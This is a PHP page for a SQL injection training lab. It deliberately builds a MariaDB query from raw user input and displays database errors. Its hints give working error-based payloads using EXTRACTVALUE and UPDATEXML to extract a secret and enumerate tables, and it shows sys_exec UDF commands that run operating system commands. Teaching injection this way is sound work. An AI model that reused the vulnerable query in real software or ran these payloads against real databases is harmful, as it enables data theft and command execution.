<?php
require_once __DIR__ . '/../../includes/db.php';

$mode = $_GET['mode'] ?? 'black';
$verify_error = null;

/* =====================
   SECRET VERIFY
===================== */
if (isset($_POST['admin_password'])) {
    $submitted = $_POST['admin_password'];

    $res = mysqli_query(
        $conn,
        "SELECT secret_value FROM udf_secrets WHERE id=1 LIMIT 1"
    );
    $row = mysqli_fetch_assoc($res);

    if ($row && $submitted === $row['secret_value']) {
        $_SESSION['mariadb_lab6_solved'] = true;
        header("Location: " . url_lab_from_slug("mariadb/lab6", $mode));
        exit;
    } else {
        $verify_error = "Incorrect. Keep trying!";
    }
}
?>

<!-- Lab Description -->
<div class="card">
    <h3>Lab 6: sys_exec UDF: OS Commands</h3>

    <h4>Scenario</h4>
    <p>
        A system log viewer application displays log entries from a MariaDB database.
        The application only shows success/failure messages: no query data is rendered
        on screen. However, <strong>raw error messages</strong> are displayed when queries fail.
    </p>
    <p>
        In a real-world scenario, MariaDB can be extended with <strong>User-Defined Functions (UDFs)</strong>
        that execute operating system commands. The <code>lib_mysqludf_sys</code> library provides
        functions like <code>sys_exec()</code> and <code>sys_eval()</code>:
    </p>

    <div class="terminal">
        <div class="terminal-header">
            <span class="terminal-dot red"></span>
            <span class="terminal-dot yellow"></span>
            <span class="terminal-dot green"></span>
            <span class="terminal-title">sys_exec UDF. Concept</span>
        </div>
        <div class="terminal-body">
            <span class="prompt">mariadb&gt; </span>CREATE FUNCTION sys_exec RETURNS INT<br>
            &nbsp;&nbsp;SONAME 'lib_mysqludf_sys.so';<br><br>
            <span class="prompt">mariadb&gt; </span>SELECT sys_exec('id > /tmp/whoami.txt');<br>
            <span class="comment">-- Executes OS command as the mysql user!</span><br><br>
            <span class="prompt">mariadb&gt; </span>CREATE FUNCTION sys_eval RETURNS STRING<br>
            &nbsp;&nbsp;SONAME 'lib_mysqludf_sys.so';<br><br>
            <span class="prompt">mariadb&gt; </span>SELECT sys_eval('whoami');<br>
            <span class="comment">-- Returns: mysql (or whatever user MariaDB runs as)</span>
        </div>
    </div>

    <h4>Objective</h4>
    <p>
        The log lookup shows only "Found" or "Not found": but it displays errors.
        Use <strong>error-based extraction</strong> with <code>EXTRACTVALUE()</code> or
        <code>UPDATEXML()</code> to leak the <strong>secret value</strong> from the
        <code>udf_secrets</code> table through error messages.
    </p>

    <h4>Hints</h4>
    <span class="hint-toggle" data-hint="hint1">&#128161; Click for hints</span>
    <div id="hint1" class="hint-content">
        1. The query checks if a log entry exists: it only shows "Found" or "Not found".<br>
        2. But errors ARE displayed! Use error-based extraction.<br>
        3. EXTRACTVALUE payload: <code>' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT secret_value FROM udf_secrets LIMIT 1))) -- -</code><br>
        4. UPDATEXML payload: <code>' AND UPDATEXML(1, CONCAT(0x7e, (SELECT secret_value FROM udf_secrets LIMIT 1)), 1) -- -</code><br>
        5. Enumerate tables first: <code>' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()))) -- -</code>
    </div>
</div>

<!-- Verify Flag -->
<div class="card">
    <h4>Submit Secret Value</h4>
    <form method="POST" class="form-row">
        <input type="text" name="admin_password" class="input" placeholder="Enter the UDF secret (flag)..." required>
        <button type="submit" class="btn btn-primary">Verify</button>
    </form>

    <?php if ($verify_error): ?>
        <div class="result-error result-box"><?= htmlspecialchars($verify_error) ?></div>
    <?php endif; ?>
</div>

<!-- Solved Banner -->
<?php if (!empty($_SESSION['mariadb_lab6_solved'])): ?>

<div class="solved-banner">
    <span class="solved-icon">&#127942;</span>
    <div>
        <div class="solved-title">Lab Solved!</div>
        <div class="solved-desc">You used error-based extraction to leak the UDF secret. In a real scenario, sys_exec() UDF could provide full remote code execution.</div>
    </div>
</div>

<?php else: ?>

<!-- Vulnerable Query Interface -->
<div class="card">
    <h4>Log Entry Lookup</h4>
    <form method="POST" class="form-row">
<input type="text" name="action" class="input" placeholder="Search log action (try: LOGIN)" value="<?= htmlspecialchars($_POST['action'] ?? '') ?>">
        <button type="submit" class="btn btn-primary">Search Logs</button>
    </form>
</div>

<?php
if (isset($_POST['action'])) {
    $action = $_POST['action'];

    // INTENTIONALLY VULNERABLE: direct string concatenation
    $query = "SELECT COUNT(*) as cnt FROM system_logs WHERE action = '$action'";

    // Show the executed query in a terminal block
    echo '<div class="terminal">';
    echo '  <div class="terminal-header">';
    echo '    <span class="terminal-dot red"></span>';
    echo '    <span class="terminal-dot yellow"></span>';
    echo '    <span class="terminal-dot green"></span>';
    echo '    <span class="terminal-title">MariaDB Query</span>';
    echo '  </div>';
    echo '  <div class="terminal-body" data-highlight="sql">';
    echo '    <span class="prompt">mariadb&gt; </span>' . htmlspecialchars($query);
    echo '  </div>';
    echo '</div>';

    // Execute: only show count, not actual data (simulates blind-ish scenario)
    try {
        $result = mysqli_query($conn, $query);

        if (!$result) {
            echo '<div class="result-error result-box">';
            echo '<strong>MariaDB Error:</strong><br>' . htmlspecialchars(mysqli_error($conn));
            echo '</div>';
        } else {
            $row = mysqli_fetch_assoc($result);
            $count = (int)$row['cnt'];

            if ($count > 0) {
                echo '<div class="result-data result-box">';
                echo '<strong>Result:</strong> Found <strong>' . $count . '</strong> log entries matching that action.';
                echo '</div>';
            } else {
                echo '<div class="result-warning result-box">No log entries found for that action.</div>';
            }
        }
    } catch (mysqli_sql_exception $e) {
        echo '<div class="result-error result-box">MariaDB Error: ' . htmlspecialchars($e->getMessage()) . '</div>';
    }
}
?>

<?php endif; ?>
